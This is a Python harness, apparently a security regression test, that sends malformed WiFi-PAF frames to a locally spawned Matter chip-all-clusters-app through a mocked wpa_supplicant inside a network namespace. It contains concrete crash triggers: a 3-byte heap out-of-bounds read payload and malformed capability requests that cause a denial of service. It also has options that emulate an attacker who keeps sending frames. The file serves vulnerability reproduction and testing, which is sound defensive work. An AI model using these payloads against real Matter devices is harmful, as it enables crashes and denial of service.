#!/usr/bin/env python3
# Adversarial WiFi-PAF harness against a real chip-all-clusters-app publisher,
# using WpaSupplicantMock as the NAN/D-Bus transport. Requires root (netns +
# private system bus).
#
# Usage:
#   sudo -E python3 scripts/tests/wifipaf_malformed_cap_repro.py \
#       [--scenario {f4-cap,f4-fuzz,f4-mixed,f3,all}] \
#       [--repeat N] [--repeat-delay MS] \
#       /path/to/chip-all-clusters-app
#
# Scenarios (after a faked NAN discovery reply that creates a real publisher
# endpoint):
#   f4-cap    — single 5-byte malformed cap request (initial F-4 reachability test).
#   f4-fuzz   — exact original fuzz counterexample, two identical 5-byte frames.
#   f4-mixed  — valid 9-byte cap request, then a mix of malformed PAFTP frames
#               (post-handshake close path) plus repeats of the bare malformed
#               cap request on a fresh discovery.
#   f3        — 3-byte PAFTP fragment 0x2B 0x8F 0x2B that triggers heap-OOB read
#               in WiFiPAFEndPoint::GetPktSn (src/wifipaf/WiFiPAFEndPoint.cpp:847-848).
#   all       — run f3, f4-cap, f4-fuzz, f4-mixed in sequence (default), each
#               against a freshly-spawned chip-all-clusters-app so a crash in one
#               doesn't shadow the others.
#
# --repeat N             Send the trigger frame N times back-to-back (default 1).
#                        Useful for non-ASan builds to test reorder-queue
#                        exhaustion or probabilistic crashes due to varying
#                        heap layout.
# --repeat-delay MS      Delay in milliseconds between repeated frames (default 10).
# --ignore-session-gone  Keep injecting frames after the publisher cancels its
#                        NAN publish, reusing the last-known publish_id. Models
#                        an attacker that keeps blasting the victim's MAC after
#                        publish cancellation. Without this flag, the harness
#                        bails as soon as the mock sees NANCancelPublish.
# --retry-discovery N    After sending the f3 trigger frame(s), wait briefly,
#                        then emit N additional NANReplied signals (default 0,
#                        i.e. disabled). Tests whether the publisher can be
#                        coaxed back into a usable state via fresh discovery
#                        after a malformed-frame-induced close — i.e. whether
#                        the soft-DoS is recoverable without app-level action.
#
# Currently --repeat, --ignore-session-gone, and --retry-discovery apply to
# the f3 scenario only.
#
# A non-zero exit (typically -11 SEGV or ASan abort) indicates the frame
# crashed the app. Clean shutdown (rc=0) means the app handled it.

import argparse
import asyncio
import os
import signal
import struct
import subprocess
import sys
import time
from typing import Any, Callable

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..",
                                "src", "python_testing",
                                "matter_testing_infrastructure"))

from matter.testing.linux import (  # noqa: E402
    DBusTestSystemBus, IsolatedNetworkNamespace, WpaSupplicantMock,
)

APP_IFACE = "wlx-app"
TOOL_IFACE = "wlx-tool"

# 5-byte malformed capabilities request: fails
# PAFTransportCapabilitiesRequestMessage::Decode at
# src/wifipaf/WiFiPAFLayer.cpp:171 (MESSAGE_INCOMPLETE) and returns error
# through Receive -> DoClose -> FinalizeClose.
MALFORMED_CAP_REQ = bytes([0x01, 0x00, 0x01, 0x00, 0x00])

# Valid capabilities request (9 bytes). 0x65, 0x6C are the magic check bytes
# (CAPABILITIES_MSG_CHECK_BYTE_1/2); versions nibble-packed in bytes 2..5;
# mtu little-endian in bytes 6..7; window size in byte 8. Matches the cap-req
# seed in FuzzWiFiPAFEndPointPW.cpp.
VALID_CAP_REQ = bytes([0x65, 0x6C, 0x04, 0x00, 0x00, 0x00, 0x5E, 0x01, 0x06])

# PAFTP data frame shapes used by the fuzz crash inputs — nonsense byte
# sequences that look like PAFTP headers but fail decode / sequencing.
MALFORMED_PAFTP_FRAMES = [
    bytes([0x05, 0x01, 0x01, 0x00, 0x00]),  # start+end+ack seq 1
    bytes([0x01, 0x00, 0x01, 0x00, 0x00]),  # start only, no ack
    bytes([0x04, 0x01, 0x02, 0x00]),        # end only, seq 2
    bytes([0x05, 0x4C, 0x01, 0x00, 0x00]),  # byte-for-byte from second fuzz crash
    bytes([0x4B]),                           # 1-byte "K" from second fuzz crash
]


def _run_on_loop(mock: WpaSupplicantMock, fn):
    async def _run():
        fn()
    asyncio.run_coroutine_threadsafe(_run(), mock.loop).result(timeout=5)


# Cached publish_id captured at discovery time; reused as the NANReceive
# session id when --ignore-session-gone is set. Mirrors what a real attacker
# would do: sniff the publish_id once, then keep blasting frames addressed to
# it even after the victim cancels its publish.
_LAST_PUBLISH_ID: dict[str, int] = {}


def trigger_discovery(mock: WpaSupplicantMock, iface_name: str, discriminator: int = 0xF00):
    """Simulate a subscriber reply so the publisher creates a WiFiPAFEndPoint.
    Without this step OnWiFiPAFMessageReceived drops the frame at
    src/wifipaf/WiFiPAFLayer.cpp:270 ("No endpoint for received indication")."""
    iface = mock.nan_simulator.interfaces[iface_name]
    if not iface.nan_sessions:
        raise RuntimeError(f"No publish on {iface_name}")
    pub_id = next(iter(iface.nan_sessions))
    _LAST_PUBLISH_ID[iface_name] = pub_id

    # struct PAFPublishSSI { u8 DevOpCode; u16 DevInfo; u16 ProductId; u16 VendorId; }
    # packed, little-endian. DevInfo must match commissioner discriminator (3840 = 0xF00).
    ssi = struct.pack("<BHHH", 0x00, discriminator, 0x8001, 0xFFF1)

    replied = {
        "publish_id": ("u", pub_id),
        "subscribe_id": ("u", 0xdead),
        "peer_addr": ("s", "aa:bb:cc:dd:ee:ff"),
        "srv_proto_type": ("u", 3),  # NAN_SRV_PROTO_CSA_MATTER
        "ssi": ("ay", ssi),
    }
    _run_on_loop(mock, lambda: iface.NANReplied.emit(replied))


def inject_nan_receive(mock: WpaSupplicantMock, iface_name: str, ssi: bytes,
                       ignore_session_gone: bool = False):
    """Emit an NANReceive on the given interface with arbitrary SSI payload,
    as if a remote peer had sent a NAN follow-up to our active session.

    If ignore_session_gone is True and the publisher has cancelled its publish
    (no active sessions in the mock), reuse the last-known publish id instead
    of raising. This simulates an attacker that keeps transmitting frames
    addressed to the victim's MAC after the victim has stopped publishing."""
    iface = mock.nan_simulator.interfaces[iface_name]
    if iface.nan_sessions:
        session_id = next(iter(iface.nan_sessions))
    elif ignore_session_gone and iface_name in _LAST_PUBLISH_ID:
        session_id = _LAST_PUBLISH_ID[iface_name]
    else:
        raise RuntimeError(f"No active NAN session on {iface_name}; publisher not ready")
    args = {
        "id": ("u", session_id),
        "peer_id": ("u", 0xdead),
        "peer_addr": ("s", "aa:bb:cc:dd:ee:ff"),
        "ssi": ("ay", ssi),
    }
    _run_on_loop(mock, lambda: iface.NANReceive.emit(args))


def wait_for_publish(mock: WpaSupplicantMock, timeout: float = 60.0):
    """Block until chip-all-clusters-app calls NANPublish on the mock."""
    deadline = time.monotonic() + timeout
    last_status = 0.0
    while time.monotonic() < deadline:
        iface = mock.nan_simulator.interfaces.get(APP_IFACE)
        if iface and iface.nan_sessions:
            return
        if time.monotonic() - last_status > 5.0:
            print(f"[harness] still waiting for NANPublish "
                  f"(elapsed {time.monotonic() - (deadline - timeout):.1f}s, "
                  f"interfaces={list(mock.nan_simulator.interfaces)}, "
                  f"publishers={list(mock.nan_simulator.publishers)})", flush=True)
            last_status = time.monotonic()
        time.sleep(0.1)
    raise TimeoutError("Publisher never called NANPublish on the mock")


def _scenario_f4_cap(mock, app):
    """Single 5-byte malformed cap request (initial F-4 reachability test)."""
    print("[harness] f4-cap: sending single 5-byte malformed cap request", flush=True)
    inject_nan_receive(mock, APP_IFACE, MALFORMED_CAP_REQ)


def _scenario_f4_fuzz(mock, app):
    """Exact first-fuzz counterexample: two identical 5-byte frames back-to-back."""
    print("[harness] f4-fuzz: sending counterexample frame 1/2", flush=True)
    inject_nan_receive(mock, APP_IFACE, MALFORMED_CAP_REQ)
    print("[harness] f4-fuzz: sending counterexample frame 2/2", flush=True)
    try:
        inject_nan_receive(mock, APP_IFACE, MALFORMED_CAP_REQ)
    except Exception as e:
        print(f"[harness]   second inject failed (session gone?): {e}", flush=True)


def _scenario_f4_mixed(mock, app):
    """Valid handshake, then post-handshake malformed PAFTP, then repeats."""
    print("[harness] f4-mixed: valid cap-req -> malformed PAFTP -> repeats", flush=True)
    inject_nan_receive(mock, APP_IFACE, VALID_CAP_REQ)
    time.sleep(0.5)
    for i, frame in enumerate(MALFORMED_PAFTP_FRAMES):
        if app.poll() is not None:
            print(f"[harness]   app died during post-handshake frame {i}", flush=True)
            return
        print(f"[harness]   post-handshake frame {i}: {frame.hex()}", flush=True)
        try:
            inject_nan_receive(mock, APP_IFACE, frame)
        except Exception as e:
            print(f"[harness]   inject failed (session gone?): {e}", flush=True)
            break
        time.sleep(0.3)

    if app.poll() is not None:
        return
    try:
        trigger_discovery(mock, APP_IFACE)
        time.sleep(0.5)
    except Exception as e:
        print(f"[harness]   re-discovery skipped: {e}", flush=True)
    for i in range(5):
        if app.poll() is not None:
            return
        try:
            inject_nan_receive(mock, APP_IFACE, MALFORMED_CAP_REQ)
        except Exception as e:
            print(f"[harness]   repeat inject failed: {e}", flush=True)
            break
        time.sleep(0.2)


def _scenario_f3(mock, app, repeat: int = 1, repeat_delay_ms: int = 10,
                 ignore_session_gone: bool = False,
                 retry_discovery: int = 0):
    """F-3: 3-byte PAFTP fragment triggers heap-OOB read in GetPktSn.

    First byte 0x2B = kFragmentAck | kManagementOpcode | kStartMessage; SnOffset
    computes to 3 (header + mgmt-op + ack); the buffer is only 3 bytes (indices
    0..2), so pHead+3 at WiFiPAFEndPoint.cpp:848 reads past the end. The
    Read8 status code at line 831 is discarded, so a buffer too short for even
    the ack byte still propagates uninitialized rx_flags into SnOffset.

    With repeat>1, sends the trigger many times back-to-back to test:
      - probabilistic crash on non-ASan builds (heap layout varies between sends);
      - reorder-queue exhaustion (each malformed frame inflates the queue with
        a stale entry whose synthetic seqNum will never match real traffic)."""
    payload = bytes([0x2B, 0x8F, 0x2B])
    if repeat <= 1:
        print(f"[harness] f3: sending 3-byte trigger {payload.hex()}"
              f"{' (ignore-session-gone)' if ignore_session_gone else ''}",
              flush=True)
        inject_nan_receive(mock, APP_IFACE, payload,
                           ignore_session_gone=ignore_session_gone)
    else:
        print(f"[harness] f3: sending 3-byte trigger {payload.hex()} x{repeat} "
              f"(delay {repeat_delay_ms}ms"
              f"{', ignore-session-gone' if ignore_session_gone else ''})",
              flush=True)
        delay = repeat_delay_ms / 1000.0
        sent_post_cancel = 0
        for i in range(repeat):
            if app.poll() is not None:
                print(f"[harness] f3: app died at iteration {i} (after "
                      f"{sent_post_cancel} post-cancel sends)", flush=True)
                return
            iface = mock.nan_simulator.interfaces[APP_IFACE]
            post_cancel = not iface.nan_sessions
            try:
                inject_nan_receive(mock, APP_IFACE, payload,
                                   ignore_session_gone=ignore_session_gone)
                if post_cancel:
                    sent_post_cancel += 1
            except Exception as e:
                print(f"[harness] f3: inject failed at iteration {i} "
                      f"(session gone?): {e}", flush=True)
                return
            if delay > 0:
                time.sleep(delay)
        print(f"[harness] f3: completed {repeat} injections "
              f"({sent_post_cancel} after publish cancellation), app still alive",
              flush=True)

    # Optionally try to coax the publisher back into a usable state by
    # re-emitting NANReplied (fresh discovery). Tests whether the soft-DoS
    # is recoverable without app-level intervention: if the publisher creates
    # a new endpoint here, it can be re-attacked / re-commissioned.
    for n in range(retry_discovery):
        time.sleep(0.5)
        if app.poll() is not None:
            print(f"[harness] f3: app died before retry-discovery {n}", flush=True)
            return
        print(f"[harness] f3: retry-discovery {n + 1}/{retry_discovery} — "
              f"emitting NANReplied to test recovery", flush=True)
        try:
            trigger_discovery(mock, APP_IFACE)
        except RuntimeError as e:
            print(f"[harness] f3: retry-discovery {n + 1} failed: {e} "
                  f"(publisher hasn't re-published — soft-DoS holds)",
                  flush=True)
            return
        time.sleep(1.0)


# Heterogeneous signatures (f3 takes extra kwargs); broaden the value type so
# Pyright can dispatch through the dict.
SCENARIOS: dict[str, Callable[..., Any]] = {
    "f4-cap": _scenario_f4_cap,
    "f4-fuzz": _scenario_f4_fuzz,
    "f4-mixed": _scenario_f4_mixed,
    "f3": _scenario_f3,
}


def run_scenario(scenario_name: str, app_bin: str,
                 repeat: int = 1, repeat_delay_ms: int = 10,
                 ignore_session_gone: bool = False,
                 retry_discovery: int = 0):
    """Spawn a fresh chip-all-clusters-app under the mock and run one scenario."""
    print(f"\n========== scenario: {scenario_name} ==========", flush=True)

    # Wipe persistent state so the app boots into commissioning mode and
    # advertises NAN. Without this, after a previous run the app reads fabric
    # data from /tmp/chip_kvs and goes to "commissioning mode 0", which means
    # NANPublish is never called and the harness times out.
    for stale in ("/tmp/chip_kvs", "/tmp/chip_counters.ini",
                  "/tmp/chip_factory.ini", "/tmp/chip_config.ini"):
        try:
            os.remove(stale)
        except FileNotFoundError:
            pass
        except OSError as e:
            print(f"[harness] could not remove {stale}: {e}", flush=True)

    bus = DBusTestSystemBus()
    ns = IsolatedNetworkNamespace(
        index=0, app_link_up=False,
        app_link_name=APP_IFACE, tool_link_name=TOOL_IFACE)
    mock = WpaSupplicantMock([APP_IFACE, TOOL_IFACE],
                             "MatterAP", "MatterAPPassword", ns)

    app = None
    rc = None
    try:
        env = {**os.environ, "DBUS_SYSTEM_BUS_ADDRESS": DBusTestSystemBus.ADDRESS,
               # Verbose libchip platform logging helps when NANPublish stalls.
               "G_MESSAGES_DEBUG": "all"}
        cmd = ns.app_ns.wrap_cmd([app_bin, "--wifi", "--wifipaf", "freq_list=2437"])
        print(f"[harness] launching: {' '.join(cmd)}", flush=True)
        print(f"[harness] DBUS_SYSTEM_BUS_ADDRESS={DBusTestSystemBus.ADDRESS}", flush=True)
        app = subprocess.Popen(cmd, env=env)

        print("[harness] waiting for NANPublish ...", flush=True)
        wait_for_publish(mock)
        print("[harness] publisher up, faking subscriber discovery reply", flush=True)
        time.sleep(1.0)
        trigger_discovery(mock, APP_IFACE)
        time.sleep(1.0)

        if scenario_name == "f3":
            _scenario_f3(mock, app, repeat=repeat, repeat_delay_ms=repeat_delay_ms,
                         ignore_session_gone=ignore_session_gone,
                         retry_discovery=retry_discovery)
        else:
            SCENARIOS[scenario_name](mock, app)

        try:
            rc = app.wait(timeout=10)
        except subprocess.TimeoutExpired:
            print("[harness] app still alive after 10s — no crash observed", flush=True)
            app.send_signal(signal.SIGTERM)
            rc = app.wait(timeout=5)
            print(f"[harness] app exited cleanly, rc={rc}", flush=True)
            return rc

        if rc < 0:
            print(f"[harness] CRASH — app killed by signal {-rc} (SIGSEGV=-11)", flush=True)
        else:
            print(f"[harness] app exited early, rc={rc}", flush=True)
    finally:
        if app is not None and app.poll() is None:
            app.send_signal(signal.SIGTERM)
            try:
                app.wait(timeout=5)
            except subprocess.TimeoutExpired:
                app.kill()
        mock.terminate()
        ns.terminate()
        bus.terminate()
    return rc


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--scenario", choices=list(SCENARIOS.keys()) + ["all"],
                        default="all")
    parser.add_argument("--repeat", type=int, default=1,
                        help="For f3 scenario: number of trigger injections (default 1)")
    parser.add_argument("--repeat-delay", type=int, default=10,
                        metavar="MS",
                        help="Milliseconds between repeated injections (default 10)")
    parser.add_argument("--ignore-session-gone", action="store_true",
                        help="Keep injecting frames after the publisher cancels its "
                             "NAN publish (uses the last-known publish_id). Simulates "
                             "an attacker that keeps blasting the victim's MAC after "
                             "publish cancellation. Currently affects f3 scenario only.")
    parser.add_argument("--retry-discovery", type=int, default=0, metavar="N",
                        help="After f3 trigger frames, emit N additional NANReplied "
                             "signals to test whether the publisher will create a "
                             "new endpoint and recover. Default 0 (disabled).")
    parser.add_argument("app_bin", help="Path to chip-all-clusters-app")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Must run as root (netns + private system bus).", file=sys.stderr)
        sys.exit(2)
    app_bin = os.path.abspath(args.app_bin)

    if args.scenario == "all":
        scenarios = ["f3", "f4-cap", "f4-fuzz", "f4-mixed"]
    else:
        scenarios = [args.scenario]

    results = {}
    for s in scenarios:
        results[s] = run_scenario(s, app_bin,
                                  repeat=args.repeat,
                                  repeat_delay_ms=args.repeat_delay,
                                  ignore_session_gone=args.ignore_session_gone,
                                  retry_discovery=args.retry_discovery)

    print("\n========== summary ==========", flush=True)
    for s, rc in results.items():
        verdict = "CRASH" if rc is not None and rc < 0 else f"rc={rc}"
        print(f"  {s:10s} -> {verdict}", flush=True)


if __name__ == "__main__":
    main()
